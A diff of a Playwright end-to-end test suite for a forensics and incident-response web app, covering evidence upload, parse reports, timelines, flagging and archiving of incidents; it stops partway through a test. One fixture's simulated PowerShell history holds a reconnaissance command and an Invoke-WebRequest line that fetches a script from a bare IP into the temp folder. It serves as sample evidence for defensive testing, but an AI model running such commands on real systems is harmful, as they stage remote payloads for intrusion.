@@ -25,24 +25,101 @@ let lastIncident = null
 // What the Content-Security-Policy blocked, if anything: the suite ends by checking it is empty.
 const blocked = []
 
-/** Drop a fixture file on the app, as from the file manager, and import it where Nik proposes. */
-async function dropFixture(name) {
-  const content = readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8')
-  const transfer = await page.evaluateHandle(
-    ([fileName, text]) => {
-      const data = new DataTransfer()
-      data.items.add(new File([text], fileName))
-      return data
-    },
-    [name, content],
-  )
-  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
-  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
-  const dialog = page.getByRole('dialog', { name: 'Add a file' })
-  await expect(dialog).toBeVisible()
-  await dialog.getByRole('button', { name: 'Import' }).click()
-  await expect(dialog).toBeHidden()
+/** A fixture file of e2e/fixtures, as bytes. */
+const fixture = (name) => readFileSync(new URL(`./fixtures/${name}`, import.meta.url))
+
+/** The sources table of the page of host evidence that is open (the title of each page starts with "Sources"). */
+const sourcesTable = () => page.getByRole('region', { name: /^Sources/ })
+
+/** The row of a file in that table (its report, when open, is a row of its own below it). */
+const sourceRow = (name) =>
+  sourcesTable()
+    .locator('tbody tr')
+    .filter({ has: page.getByRole('cell', { name, exact: true }) })
+    .first()
+
+/** The table of records of the page (the sources table comes before it). */
+const recordsTable = () => page.getByRole('table').last()
+
+/**
+ * Add a file to the page of host evidence that is open with "Add files", as the person picks it, and wait for
+ * the worker to read it: the row of the file says what became of it (`read`).
+ */
+async function addEvidence(name, content, read = 'complete') {
+  await sourcesTable()
+    .getByLabel('Choose files to add')
+    .setInputFiles({ name, mimeType: 'application/octet-stream', buffer: Buffer.from(content) })
+  return waitRead(name, read)
 }
+
+/** Wait for the row of a file to say how it was read; when it does not, say why the server gave (the title of its pill). */
+async function waitRead(name, read = 'complete') {
+  const row = sourceRow(name)
+  await expect(row).toBeVisible({ timeout: 30_000 })
+  try {
+    await expect(row.getByText(read)).toBeVisible({ timeout: 60_000 })
+  } catch (failure) {
+    const reason = await row
+      .locator('td:nth-child(5) [title]')
+      .first()
+      .getAttribute('title')
+      .catch(() => '')
+    throw new Error(
+      `${name} did not end "${read}": ${reason}
+${failure.message}`,
+      { cause: failure },
+    )
+  }
+  return row
+}
+
+/** An event of nik-eventlogs.json, as the collection script writes it. */
+const logEvent = (channel, id, record, time, data = {}) => ({
+  LogName: channel,
+  Id: id,
+  RecordId: record,
+  TimeCreated: time,
+  MachineName: 'WKS-FINANCE-01',
+  ProviderName: 'Microsoft-Windows-Security-Auditing',
+  Level: 4,
+  Data: data,
+})
+
+/** An event-log file the worker reads in part: two events it keeps (one that matters, one that does not) and an element that is no event. */
+const partialEventLog = () =>
+  JSON.stringify({
+    format: 'nik-eventlogs',
+    host: 'WKS-FINANCE-01',
+    events: [
+      logEvent('Security', 4688, 9500, '2025-11-07T02:30:00Z', { NewProcessName: 'C:\\Windows\\System32\\cmd.exe' }),
+      logEvent('Application', 1000, 9501, '2025-11-07T02:31:00Z', { Application: 'excel.exe' }),
+      42,
+    ],
+  })
+
+/** A setupapi.dev.log with one USB storage install: the worker knows it by its first lines, whatever the page says. */
+const SETUPAPI_LOG = [
+  '[Device Install Log]',
+  '     OS Version = 10.0.19045',
+  '',
+  '[BeginLog]',
+  '',
+  '[Boot Session: 2025/11/07 08:00:00.000]',
+  '',
+  '>>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_Kingston&Prod_DT&Rev_1.00\\0123456789&0]',
+  '>>>  Section start 2025/11/07 08:03:11.123',
+  '     cmd: C:\\Windows\\system32\\svchost.exe',
+  '<<<  Section end 2025/11/07 08:03:12.000',
+  '',
+].join('\n')
+
+/** A PowerShell history, as ConsoleHost_history.txt holds it. */
+const POWERSHELL_HISTORY = [
+  'Get-Process',
+  'whoami /all',
+  'Invoke-WebRequest http://185.220.101.47/p.ps1 -OutFile $env:TEMP\\p.ps1',
+  '',
+].join('\r\n')
 
 test.beforeAll(async ({ browser }) => {
   page = await browser.newPage()
@@ -193,7 +270,10 @@ test('what was collected on the machine asks which system the incident is about'
   await dialog.getByRole('button', { name: 'Use Windows' }).click()
   await expect(dialog).toHaveCount(0)
   await expect(current).toContainText('Command History')
-  await expect(page.getByText(/Where to find the .* history \(Windows\)/)).toBeVisible()
+  // Where to find the file is one click away on the page itself, for the system the incident was given.
+  await page.getByRole('button', { name: 'Where to find these files' }).click()
+  await expect(page.getByRole('dialog', { name: /Where to find the .* history \(Windows\)/ })).toBeVisible()
+  await page.keyboard.press('Escape')
   await expect
     .poll(async () => (await (await page.request.get(`/api/incidents/${incidentId}`)).json()).os)
     .toBe('windows')
@@ -205,36 +285,218 @@ test('what was collected on the machine asks which system the incident is about'
   await expect(page.getByRole('article', { name: 'Incident details' })).toContainText('Windows')
 })
 
-test('evidence files dropped on the app fill the analysis tabs', async () => {
+test('host evidence is added with "Add files" on each of the four pages, and the worker reads it', async () => {
+  test.setTimeout(240_000)
   const current = page.locator('nav[aria-label="Evidence"] [aria-current="page"]')
-  const files = [
-    ['Bookmarks', 'Browser Forensics', /^Bookmarks/],
-    ['bash_history', 'Command History'],
-    ['bam-export.csv', 'Endpoint Artifacts'],
-    ['nik-eventlogs.json', 'Event Logs'],
-  ]
-  for (const [name, tab, section] of files) {
-    await dropFixture(name)
-    await expect(current).toContainText(tab)
-    if (section) {
-      await page
-        .getByRole('navigation', { name: 'Browser analysis sections' })
-        .getByRole('button', { name: section })
-        .click()
-    }
-    await expect(page.locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
-  }
+
+  // Event Logs: a collection script's export; the row reaches "complete" and its records are listed.
+  await openEvidence('Event Logs')
+  await expect(current).toContainText('Event Logs')
+  // Nothing is there yet: the table of sources, with its add button, is the empty state.
+  await expect(sourcesTable().getByRole('button', { name: 'Add files' })).toBeVisible()
+  const log = await addEvidence('nik-eventlogs.json', fixture('nik-eventlogs.json'))
+  await expect(log).toContainText('7 / 7')
+  await expect(page.getByRole('tab', { name: /^Events/ })).toContainText('7')
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(7)
+  await expect(recordsTable()).toContainText('Security')
+  await expect(recordsTable()).toContainText('4625')
+
+  // Browser Forensics: the bookmarks of Chrome are the records of its Bookmarks part.
+  await openEvidence('Browser Forensics')
+  await expect(current).toContainText('Browser Forensics')
+  await addEvidence('Bookmarks', fixture('Bookmarks'))
+  await page.getByRole('tab', { name: /^Bookmarks/ }).click()
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable()).toContainText('Invoice portal')
+
+  // Command History: who and where are given before the file, and kept with it.
+  await openEvidence('Command History')
+  await expect(current).toContainText('Command History')
+  await page.getByRole('textbox', { name: 'User' }).fill('m.rossi')
+  await page.getByRole('textbox', { name: 'Host' }).fill('WKS-FINANCE-01')
+  const history = await addEvidence('ConsoleHost_history.txt', POWERSHELL_HISTORY)
+  await expect(history).toContainText('m.rossi')
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable()).toContainText('whoami /all')
+
+  // Endpoint Artifacts: the setupapi log of the USB category (a file the worker knows by what is in it).
+  await openEvidence('Endpoint Artifacts')
+  await expect(current).toContainText('Endpoint Artifacts')
+  await page.getByRole('tab', { name: /^USB & Devices/ }).click()
+  await page.getByLabel('Add files as').selectOption({ label: 'setupapi log' })
+  await addEvidence('setupapi.dev.log', SETUPAPI_LOG)
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable()).toContainText('USBSTOR')
 })
 
-test('the timeline merges the events of every tab', async () => {
+test('the timeline reads the host records from the server and merges them', async () => {
   await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
-  await expect(page.locator('tbody tr').first()).toBeVisible()
-  const counter = page.getByText(/of \d+ results/)
-  await expect(counter).toBeVisible()
-  expect(await counter.textContent()).not.toMatch(/of 0 results/)
-  for (const source of ['Bash', 'Security']) {
-    await expect(page.locator('tbody').getByText(source).first()).toBeVisible()
-  }
+  await expect(page.locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(page.getByText('Timeline events', { exact: true })).toBeVisible()
+  // Records of the event logs, the command history and the other pages sit in one list, each leading to its page.
+  const rows = page.locator('tbody')
+  await expect(rows.getByText('whoami /all').first()).toBeVisible()
+  await expect(rows.getByText(/4625|Security/).first()).toBeVisible()
+  await expect(rows.getByRole('button', { name: 'Open the page of Command' }).first()).toBeVisible()
+  await expect(rows.getByRole('button', { name: 'Open the page of Event log' }).first()).toBeVisible()
+})
+
+test('a record opens its original: the Source drawer shows the record, then the whole file as bytes', async () => {
+  await openEvidence('Event Logs')
+  await recordsTable().getByRole('button', { name: 'Source' }).first().click()
+  const drawer = page.getByRole('dialog', { name: 'Source of the record' })
+  await expect(drawer).toBeVisible()
+  await expect(drawer).toContainText('nik-eventlogs.json')
+  // What Nik extracted of the record, and the original it came from.
+  await expect(drawer.getByRole('region', { name: 'What Nik extracted' })).toContainText('Security')
+  await expect(drawer).toContainText('administrator', { timeout: 20_000 })
+  await expect(
+    drawer.getByRole('group', { name: 'What to show' }).getByRole('button', { name: 'This record' }),
+  ).toHaveAttribute('aria-pressed', 'true')
+  // The same file as bytes, with the offsets, read-only.
+  await drawer.getByRole('group', { name: 'What to show' }).getByRole('button', { name: 'Whole file' }).click()
+  await expect(drawer.getByRole('heading', { name: 'Source file' })).toBeVisible()
+  await expect(drawer.getByRole('group', { name: 'Show the bytes as' })).toBeVisible()
+  await expect(drawer).toContainText('Original kept on the server, read-only')
+  await expect(drawer).toContainText(/SHA-256 [0-9a-f]{16}/)
+  // A word of the record is found anywhere in the original (any case), and a click opens the page of the match.
+  await drawer.getByRole('searchbox', { name: 'Search the whole file' }).fill('ADMINISTRATOR')
+  await page.keyboard.press('Enter')
+  const matches = drawer.getByRole('list', { name: 'Matches' })
+  await expect(matches.getByRole('button').first()).toContainText(/^0x[0-9A-F]{8} · UTF-8 · 13 bytes/, {
+    timeout: 20_000,
+  })
+  await matches.getByRole('button').first().click()
+  await expect(drawer.getByTestId('find-mark').first()).toHaveText(/administrator/i)
+  await page.keyboard.press('Escape')
+  await expect(drawer).toHaveCount(0)
+})
+
+test('a parse report opens under its file: what was in it, kept, skipped and where it was read', async () => {
+  await sourceRow('nik-eventlogs.json').getByRole('button', { name: 'Report' }).click()
+  const report = page.getByRole('region', { name: 'Parse report of nik-eventlogs.json' })
+  await expect(report).toBeVisible({ timeout: 20_000 })
+  await expect(report).toContainText('Records in file')
+  await expect(report).toContainText('Kept')
+  await expect(report).toContainText('Skipped')
+  await expect(report.getByRole('button', { name: 'Download original' })).toBeVisible()
+  await expect(report.getByRole('button', { name: 'Analyse again' })).toBeVisible()
+  // It closes with the same button.
+  await sourceRow('nik-eventlogs.json').getByRole('button', { name: 'Report' }).click()
+  await expect(report).toHaveCount(0)
+})
+
+test('a file read in part says so on its row, in the header and on the page, until somebody has seen it', async () => {
+  test.setTimeout(120_000)
+  await openEvidence('Event Logs')
+  const row = await addEvidence('partial/nik-eventlogs.json', partialEventLog(), /^read in part/)
+  await expect(row).toContainText('1 skipped')
+  // The header says how many files were read in part, and leads to the first.
+  const pill = page.getByRole('banner').getByRole('button', { name: '1 file read in part' })
+  await expect(pill).toBeVisible()
+  // The Evidence list of the incident marks the kind with the yellow dot.
+  await expect(
+    page.getByRole('navigation', { name: 'Evidence' }).getByRole('img', { name: 'a file was read in part' }),
+  ).toBeVisible()
+  // The report says what was lost and why.
+  await row.getByRole('button', { name: 'Report' }).click()
+  const report = page.getByRole('region', { name: 'Parse report of partial/nik-eventlogs.json' })
+  await expect(report).toBeVisible({ timeout: 20_000 })
+  await expect(report).toContainText('element is not an event')
+  await expect(report.getByRole('button', { name: 'Seen' })).toBeVisible()
+  // From another page, the pill brings the person to the file.
+  await openEvidence('Browser Forensics')
+  await pill.click()
+  await expect(page.locator('nav[aria-label="Evidence"] [aria-current="page"]')).toContainText('Event Logs')
+  // Acknowledged with a note: the pill goes, the row says it was seen.
+  if (!(await report.isVisible()))
+    await sourceRow('partial/nik-eventlogs.json').getByRole('button', { name: 'Report' }).click()
+  await report.getByRole('button', { name: 'Seen' }).click()
+  const ask = page.getByRole('dialog', { name: 'This file was read in part' })
+  await ask.getByRole('textbox').fill('One element of the export is no event: nothing is lost.')
+  await ask.getByRole('button', { name: 'Seen' }).click()
+  await expect(pill).toHaveCount(0)
+  await expect(sourceRow('partial/nik-eventlogs.json')).toContainText('seen')
+})
+
+test('"Events that matter" shows the curated events, and every event when it is off', async () => {
+  await openEvidence('Event Logs')
+  const matter = page.getByRole('button', { name: 'Events that matter', exact: true })
+  const events = page.getByRole('tab', { name: /^Events/ })
+  // On at the start: the Application event is not one that matters. 7 events of the first file and the 4688 of the second.
+  await expect(matter).toHaveAttribute('aria-pressed', 'true')
+  // The tab counts every event, as "Events kept" does; the table says how many of them matter.
+  await expect(events).toContainText('9')
+  await expect(page.getByText('8 of 9 events matter')).toBeVisible()
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(8)
+  await expect(recordsTable()).not.toContainText('1000')
+  await matter.click()
+  await expect(matter).toHaveAttribute('aria-pressed', 'false')
+  await expect(events).toContainText('9')
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(9)
+  await expect(recordsTable()).toContainText('1000')
+  await matter.click()
+  await expect(matter).toHaveAttribute('aria-pressed', 'true')
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(8)
+})
+
+test('a record is flagged from its row, the flag stays after a reload, and the page counts it', async () => {
+  await openEvidence('Event Logs')
+  const first = recordsTable().locator('tbody tr').first()
+  await first.getByRole('button', { name: 'Flag as malicious' }).click()
+  await expect(first.getByRole('button', { name: 'Remove flag' })).toHaveAttribute('aria-pressed', 'true')
+  await expect(page.getByText('Flagged', { exact: true })).toBeVisible()
+  await page.reload()
+  await openEvidence('Event Logs')
+  await expect(recordsTable().locator('tbody tr').first().getByRole('button', { name: 'Remove flag' })).toBeVisible({
+    timeout: 20_000,
+  })
+  // The flagged filter keeps that one row.
+  await page.getByRole('button', { name: 'Flagged only', exact: true }).click()
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(1)
+  await page.getByRole('button', { name: 'Flagged only', exact: true }).click()
+  // Put back as it was: later steps expect nothing flagged.
+  await recordsTable().locator('tbody tr').first().getByRole('button', { name: 'Remove flag' }).click()
+  await expect(
+    recordsTable().locator('tbody tr').first().getByRole('button', { name: 'Flag as malicious' }),
+  ).toBeVisible()
+})
+
+test('the values of a column are stacked, and picking one filters the table on it', async () => {
+  await openEvidence('Event Logs')
+  await page.getByRole('button', { name: 'Event ID menu' }).click()
+  await page.getByRole('menuitem', { name: 'Stack values' }).click()
+  const panel = page.getByRole('dialog', { name: /^Stack values/ })
+  await expect(panel).toBeVisible()
+  // The rare one first: 4624 once, 4688 once; 4625 six times is last.
+  await expect(panel.getByRole('button', { name: '4625', exact: true })).toBeVisible({ timeout: 20_000 })
+  await expect(panel.getByText(/distinct values/)).toBeVisible()
+  await panel.getByRole('button', { name: 'Most common' }).click()
+  await expect(panel.locator('tbody tr').first()).toContainText('4625')
+  await panel.getByRole('button', { name: '4625', exact: true }).click()
+  await expect(panel).toHaveCount(0)
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(6)
+  // The pick is a filter in force, taken off with its own button.
+  await page.getByRole('button', { name: /^Remove the filter/ }).click()
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(8)
+})
+
+test('a file the incident already holds is said to be imported, and is not read again', async () => {
+  await openEvidence('Command History')
+  await sourcesTable()
+    .getByLabel('Choose files to add')
+    .setInputFiles({ name: 'ConsoleHost_history.txt', mimeType: 'text/plain', buffer: Buffer.from(POWERSHELL_HISTORY) })
+  const sending = page.getByRole('list', { name: 'Files being added' })
+  await expect(sending).toContainText('Already imported', { timeout: 30_000 })
+  await sending.getByRole('button', { name: 'Show its row' }).click()
+  await expect(page.getByRole('region', { name: 'Parse report of ConsoleHost_history.txt' })).toBeVisible({
+    timeout: 20_000,
+  })
+  await sending.getByRole('button', { name: 'Dismiss ConsoleHost_history.txt' }).click()
+  // One row for the file, and the records are not doubled.
+  await expect(sourcesTable().getByRole('cell', { name: 'ConsoleHost_history.txt', exact: true })).toHaveCount(1)
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(3)
 })
 
 test('the IOCs tab gathers the indicators and shows where they were seen', async () => {
@@ -422,19 +684,19 @@ test('right-click on an indicator adds it to the allowlist, with undo', async ()
   await expect(check).toHaveText(`Check all ${before}`)
 })
 
-test('a file dropped anywhere goes to the right tab', async () => {
+test('a file dropped anywhere on a page of host evidence is added to it', async () => {
+  test.setTimeout(120_000)
+  await openEvidence('Command History')
   const transfer = await page.evaluateHandle(() => {
     const data = new DataTransfer()
-    data.items.add(new File(['#1762500000\nwhoami /priv\n'], '.zsh_history', { type: 'text/plain' }))
+    data.items.add(new File(['whoami /priv\r\n'], 'WKS2/ConsoleHost_history.txt', { type: 'text/plain' }))
     return data
   })
   await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
   await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
-  const dialog = page.getByRole('dialog', { name: 'Add a file' })
-  await expect(dialog).toContainText('Shell history')
-  await expect(dialog.getByLabel('Shell')).toHaveValue('zsh')
-  await dialog.getByRole('button', { name: 'Import' }).click()
-  await expect(page.locator('nav[aria-label="Evidence"] [aria-current="page"]')).toContainText('Command History')
+  // No dialog asks where it goes: the page takes it, sends it in parts, and the worker reads it.
+  await expect(page.getByRole('dialog', { name: 'Add a file' })).toHaveCount(0)
+  await waitRead('WKS2/ConsoleHost_history.txt')
   await expect(page.getByText('whoami /priv').first()).toBeVisible()
 })
 
@@ -1474,13 +1736,17 @@ test('Workers lists every worker of the server and says which are not configured
   await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Workers').click()
   await expect(page).toHaveURL(/\/settings\/system\/workers$/)
   const workers = settings.getByRole('list', { name: 'Workers' })
-  await expect(workers.getByRole('listitem')).toHaveCount(7)
+  await expect(workers.getByRole('listitem')).toHaveCount(8)
+  // The forensics worker reads the files of host evidence: the test run starts one, and it answers.
+  await expect(workers.getByRole('listitem').filter({ hasText: 'forensics worker' })).toContainText(
+    /answering|not checked yet/,
+  )
   // The test server runs the playbooks itself: there is no automation worker of its own to watch.
   await expect(workers.getByRole('listitem').filter({ hasText: 'Automation worker' })).toContainText('not configured')
   const sandbox = workers.getByRole('listitem').filter({ hasText: 'Script sandbox' })
   await expect(sandbox).toContainText(/answering|not checked yet|not configured/)
   await settings.getByRole('button', { name: 'Refresh' }).click()
-  await expect(workers.getByRole('listitem')).toHaveCount(7)
+  await expect(workers.getByRole('listitem')).toHaveCount(8)
   await page.keyboard.press('Escape')
   await expect(settings).toBeHidden()
 })
@@ -1491,16 +1757,17 @@ test('Settings is a page: every section has an address, Back leaves it, a link o
   await gear.click()
   const settings = page.getByRole('region', { name: 'Settings' })
   const sections = settings.getByRole('navigation', { name: 'Settings sections' })
-  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
+  await expect(page).toHaveURL(/\/settings\/analysis\/business-hours$/)
   // The sections are in groups; the one shown is marked.
   await expect(sections.getByRole('group')).toHaveCount(8)
   await expect(sections.getByRole('group', { name: 'Rule sets' }).getByRole('button')).toHaveText([
+    'Sigma rules',
     'YARA rules',
     'capa rules',
     'FLIRT signatures',
     'Script signatures',
   ])
-  await expect(sections.getByRole('button', { name: 'Detection rules' })).toHaveAttribute('aria-current', 'page')
+  await expect(sections.getByRole('button', { name: 'Business hours' })).toHaveAttribute('aria-current', 'page')
   // The rail shows the page is open; what was open under it is not shown.
   await expect(page.getByRole('button', { name: 'Platform settings' })).toHaveAttribute('aria-pressed', 'true')
   await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()
@@ -2055,9 +2322,303 @@ test('an incident whose system was taken away is asked for it again', async () =
   await expect(dialog).toContainText('Browser Forensics cannot be shown without it')
   await dialog.getByRole('button', { name: 'Use Windows' }).click()
   await expect(dialog).toHaveCount(0)
-  await expect(page.getByRole('navigation', { name: 'Browser analysis sections' })).toBeVisible()
+  await expect(page.getByRole('tablist', { name: 'Browser', exact: true })).toBeVisible()
   await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
   await expect(page.getByRole('article', { name: 'Incident details' })).toContainText('Windows')
+})
+
+test('the refresh button brings the incident list up to date without reloading the page', async () => {
+  const panel = page.getByRole('region', { name: 'Incidents' })
+  const rows = panel.getByRole('table', { name: 'Incidents' }).locator('tbody tr')
+  await openIncidentList()
+  const before = await rows.count()
+  const address = page.url()
+  await page.evaluate(() => (window.__noReload = true))
+
+  // An incident made elsewhere (the API) is not in the list until the list is refreshed.
+  expect(
+    (
+      await page.request.post('/api/incidents', { data: { id: 'e2e-refresh', host: 'E2E-REFRESH', data: {} } })
+    ).status(),
+  ).toBe(201)
+  await panel.getByRole('button', { name: 'Refresh the list' }).click()
+  await expect(rows).toHaveCount(before + 1)
+  await expect(panel.getByRole('table', { name: 'Incidents' })).toContainText('E2E-REFRESH')
+  await expect(panel.getByText(/^Updated \d{2}\D\d{2}\D\d{2}$/)).toBeVisible()
+  expect(page.url()).toBe(address)
+  expect(await page.evaluate(() => window.__noReload)).toBe(true)
+
+  // The choice of the automatic refresh is kept for the account.
+  await panel.getByLabel('Auto-refresh:').selectOption('5m')
+  await expect(panel.getByLabel('Auto-refresh:')).toHaveValue('5m')
+  await panel.getByLabel('Auto-refresh:').selectOption('off')
+  expect((await page.request.delete('/api/incidents/e2e-refresh')).status()).toBe(204)
+})
+
+/** The incident the other tests work on, kept while these ones look at others. */
+let mainIncident = null
+
+/** Open an incident by its address, as a link to it would (without leaving the page). */
+async function openIncidentAt(path) {
+  await page.evaluate((to) => {
+    window.history.pushState({}, '', to)
+    window.dispatchEvent(new PopStateEvent('popstate'))
+  }, path)
+  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
+}
+
+/** A closed incident with a file of event logs read: made through the API, the way a script would. */
+async function seedClosedIncident(id, host) {
+  expect((await page.request.post('/api/incidents', { data: { id, host, os: 'windows', data: {} } })).status()).toBe(
+    201,
+  )
+  const sent = await page.request.post(`/api/incidents/${id}/upload?tab=eventlogs`, {
+    multipart: {
+      file: { name: 'nik-eventlogs.json', mimeType: 'application/json', buffer: fixture('nik-eventlogs.json') },
+    },
+  })
+  expect(sent.status()).toBe(200)
+  expect((await page.request.patch(`/api/incidents/${id}`, { data: { status: 'closed' } })).ok()).toBe(true)
+}
+
+test('a closed incident is archived from its header: the records are gone, the files stay, and it is read-only', async () => {
+  test.setTimeout(120_000)
+  mainIncident = lastIncident
+  await seedClosedIncident('e2e-archive', 'E2E-ARCHIVE')
+  await openIncidentAt('/incident/e2e-archive')
+  await openEvidence('Event Logs')
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  const archive = page.getByRole('banner').getByRole('button', { name: 'Archive', exact: true })
+  await archive.click()
+  const ask = page.getByRole('dialog', { name: 'Archive the incident' })
+  await expect(ask).toContainText('drops its host records from the database')
+  await ask.getByRole('button', { name: 'Archive', exact: true }).click()
+  await expect(ask).toHaveCount(0)
+  // It says so, and what it means for the page: the sources are listed, the records are not loaded, nothing is added.
+  await expect(page.getByRole('status').filter({ hasText: 'Archived' }).first()).toBeVisible({ timeout: 20_000 })
+  await expect(
+    page
+      .getByText('Archived: the records are not loaded. Take the incident out of the archive to read them again.')
+      .first(),
+  ).toBeVisible()
+  await expect(sourceRow('nik-eventlogs.json')).toBeVisible()
+  await expect(sourcesTable().getByRole('button', { name: 'Add files' })).toHaveCount(0)
+  await expect(page.getByRole('table')).toHaveCount(1)
+  // The server refuses a write to it.
+  expect((await page.request.patch('/api/incidents/e2e-archive', { data: { host: 'E2E-ARCHIVE-2' } })).status()).toBe(
+    409,
+  )
+  // The timeline reads no host record of it either.
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
+  await expect(page.getByText(/Archived: the records are not loaded/).first()).toBeVisible()
+})
+
+test('the incident list leaves the archived out, and its Archive filter shows them alone or with the rest', async () => {
+  await openIncidentList()
+  const list = page.getByRole('region', { name: 'Incidents' })
+  const table = list.getByRole('table', { name: 'Incidents' })
+  await expect(table).not.toContainText('E2E-ARCHIVE')
+  const filter = list.getByRole('combobox', { name: /^Archive/ })
+  await filter.selectOption('only')
+  await expect(table).toContainText('E2E-ARCHIVE', { timeout: 20_000 })
+  await expect(table.locator('tbody tr')).toHaveCount(1)
+  await filter.selectOption('include')
+  await expect(table).toContainText('E2E-ARCHIVE')
+  await expect(table.locator('tbody tr')).not.toHaveCount(1)
+  await filter.selectOption('exclude')
+  await expect(table).not.toContainText('E2E-ARCHIVE')
+})
+
+test('an incident taken out of the archive is writable again, and its records are read again', async () => {
+  test.setTimeout(120_000)
+  await openIncidentAt('/incident/e2e-archive')
+  await page.getByRole('banner').getByRole('button', { name: 'Take out of the archive' }).click()
+  const ask = page.getByRole('dialog', { name: 'Take the incident out of the archive' })
+  await expect(ask).toContainText('reads its files again')
+  await ask.getByRole('button', { name: 'Take out of the archive' }).click()
+  await expect(ask).toHaveCount(0)
+  await openEvidence('Event Logs')
+  await expect(sourcesTable().getByRole('button', { name: 'Add files' })).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(7, { timeout: 60_000 })
+  expect((await page.request.patch('/api/incidents/e2e-archive', { data: { host: 'E2E-ARCHIVE' } })).ok()).toBe(true)
+})
+
+test('an exported incident is imported again: its files are listed, and the originals are absent', async () => {
+  test.setTimeout(120_000)
+  await openIncidentList()
+  const list = page.getByRole('region', { name: 'Incidents' })
+  await incidentRow('E2E-ARCHIVE').click({ button: 'right' })
+  const [download] = await Promise.all([
+    page.waitForEvent('download'),
+    page.getByRole('menuitem', { name: 'Export (JSON)' }).click(),
+  ])
+  const exported = await download.path()
+  // The export carries the files with their reports, not their bytes.
+  const document = JSON.parse(readFileSync(exported, 'utf8'))
+  expect(document.evidence.sources.map((source) => source.fileName)).toContain('nik-eventlogs.json')
+  await list.locator('input[type="file"][accept=".json"]').setInputFiles(exported)
+  await expect(page).toHaveURL(/\/incident\//)
+  const imported = new URL(page.url()).pathname
+  expect(imported).not.toBe('/incident/e2e-archive')
+  // The import is saved behind the screen: the files are asked of the server once it has the incident.
+  const importedId = decodeURIComponent(imported.split('/')[2])
+  await expect.poll(async () => (await page.request.get(`/api/incidents/${importedId}`)).status()).toBe(200)
+  await page.reload()
+  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
+  await openEvidence('Event Logs')
+  const row = sourceRow('nik-eventlogs.json')
+  await expect(row).toBeVisible({ timeout: 20_000 })
+  await expect(row.getByText('original absent')).toBeVisible()
+  // The file is asked for again: the row has a button to import it, and the records are not there.
+  await expect(row.getByRole('button', { name: 'Import again' })).toBeVisible()
+  await expect(page.getByRole('table')).toHaveCount(1)
+  // What the test made is taken away, and the incident of the other tests is open again.
+  for (const gone of [importedId, 'e2e-archive'])
+    expect((await page.request.delete(`/api/incidents/${gone}`)).status()).toBe(204)
+  await openIncidentAt(mainIncident)
+})
+
+test('a link to an archived incident opens it read-only, and an address with an unknown id ends on the list of incidents', async () => {
+  test.setTimeout(120_000)
+  await seedClosedIncident('e2e-link', 'E2E-LINK')
+  // The file has to be read before the incident can be archived.
+  await expect
+    .poll(async () => (await page.request.post('/api/incidents/e2e-link/archive')).status(), { timeout: 60_000 })
+    .toBe(200)
+  // The address alone, on a fresh load of the page: the incident is not in the list, and it still opens.
+  await page.goto('/incident/e2e-link')
+  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible({ timeout: 20_000 })
+  await expect(page.getByRole('banner')).toContainText('E2E-LINK')
+  await expect(page.getByRole('status').filter({ hasText: 'Archived' }).first()).toContainText(
+    'read-only. Take it out of the archive to change it.',
+  )
+  await expect(page.getByRole('banner').getByRole('button', { name: 'Take out of the archive' })).toBeVisible()
+  expect((await page.request.patch('/api/incidents/e2e-link', { data: { host: 'E2E-LINK-2' } })).status()).toBe(409)
+  // An address with an id the server does not know leaves nothing open: the list of incidents is what is shown.
+  await page.goto('/incident/e2e-no-such-incident')
+  await expect(page.getByRole('region', { name: 'Incidents' })).toBeVisible({ timeout: 20_000 })
+  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()
+  await expect(page.getByRole('alert')).toHaveCount(0)
+  expect(new URL(page.url()).pathname).not.toContain('e2e-no-such-incident')
+  expect((await page.request.delete('/api/incidents/e2e-link')).status()).toBe(204)
+  await openIncidentAt(mainIncident)
+})
+
+test('an incident deleted while it is open in this window sends the person back to the list, with a notice and no error', async () => {
+  test.setTimeout(60_000)
+  await openFreshIncident('e2e-gone', 'E2E-GONE')
+  await openEvidence('Event Logs')
+  await expect(sourcesTable()).toBeVisible()
+  // Somebody else deletes it. The first request this page makes about it finds it gone: one of its own, when
+  // one is due, or the files of another page of evidence, asked for here as a person opening it would (the
+  // click is the page's own, at once: when the page has already left the incident there is nothing to press).
+  // A request that is not awaited with a catch would throw, and the page fails the test on any uncaught error.
+  expect((await page.request.delete('/api/incidents/e2e-gone')).status()).toBe(204)
+  await page.evaluate(() => document.querySelector('[aria-label="Evidence"] button[aria-label="Disk (NTFS)"]')?.click())
+  await expect(page.getByRole('status').filter({ hasText: 'The incident was deleted' })).toBeVisible({
+    timeout: 30_000,
+  })
